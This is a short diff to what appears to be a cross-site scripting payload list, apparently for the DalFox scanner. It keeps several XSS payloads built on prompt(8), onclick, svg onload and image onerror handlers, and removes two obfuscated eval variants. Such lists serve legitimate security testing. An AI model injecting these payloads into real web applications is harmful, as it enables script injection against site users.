@@ -33,8 +33,6 @@ DalFox
 '-prompt(8)-'
 ";a=prompt,a()//
 ';a=prompt,a()//
-'-eval("window['pro'%2B'mpt'](8)")-'
-"-eval("window['pro'%2B'mpt'](8)")-"
 "onclick=prompt(8)>"@x.y
 "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 <image/src/onerror=prompt(8)>
